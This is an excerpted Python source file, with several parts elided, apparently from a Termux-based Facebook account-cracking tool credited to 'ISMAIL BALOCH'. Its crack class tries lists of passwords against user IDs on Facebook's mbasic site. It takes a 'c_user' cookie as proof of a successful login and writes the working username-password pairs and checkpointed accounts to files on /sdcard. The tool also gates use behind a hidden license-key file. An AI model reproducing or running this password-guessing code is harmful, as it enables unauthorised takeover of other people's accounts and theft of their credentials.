...
except ModuleNotFoundError:print("ISMAIL Install Module requests");os.system("python -m pip install requests &> /dev/ISMAIL")

try: import bs4

except ModuleNotFoundError:print("ISMAIL Install Module bs4");os.system("python -m pip install bs4 &> /dev/ISMAIL")

try: import mechanize

except ModuleNotFoundError:print("ISMAIL Install Module mechanize");os.system("python -m pip install mechanize &> /dev/ISMAIL")

try: import gTTS

except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/ISMAIL")
...
def main_apv():
    ...
    try:
        ...
        key1=open('/data/data/com.termux/files/usr/bin/.ismail-cov', 'r').read()
        ...
        kok=open('/data/data/com.termux/files/usr/bin/.ismail-cov', 'w')
        ...
        os.system("xdg-open https://wa.me/+923457002762")
    ...
    if key1 in r1:
        ...
        os.system("xdg-open https://wa.me/+93457002762")
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		...
		sys.stdout.write('\r\033[1;32m[ ISMAIL 😘] \033[1;97m%s/%s   \033[1;92m[ OK-:%s ]  \033[1;91m[ CP-:%s ] '%(loop,len(self.id),len(ok),len(cp))),
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				print('\r\033[1;32m[ISMAIL-SUCCESSFUL] %s | %s      ' % (user,pw))

				wrt = '%s - %s' % (user,pw)

				ok.append(wrt)

				open('/sdcard/ISMAIL_OK.txt','a').write('%s\n' % wrt)
				...
				try:
					...
					open('/sdcard/ISMAIL_CP.txt','a').write('%s\n' % wrt)
				...
				print('\r\033[1;91m[ISMAIL-CHECKPOINT] %s | %s%s      ' % (user,pw,tahun(user)))
...
\033[1;91m[!]\033[1;94m Author \x1b[1;97m  : \x1b[1;91m          ISMAIL BALOCH

\033[1;91m[!]\033[1;93m Facebook\x1b[1;92m :  \x1b[1;92m          †『𝒊𝒔𝒎𝒂𝒊𝒍』† 輪︎︎︎︎

\033[1;91m[!]\033[1;93m WHATSAPP\x1b[1;92m :  \x1b[1;92m       03457002762

\033[1;91m[!]\033[1;92m GitHub\x1b[1;93m  :  \x1b[1;93m           ismailbaloch1122

\033[1;91m[!]\033[1;91m Version\x1b[1;94m : \x1b[1;94m             4.0.0
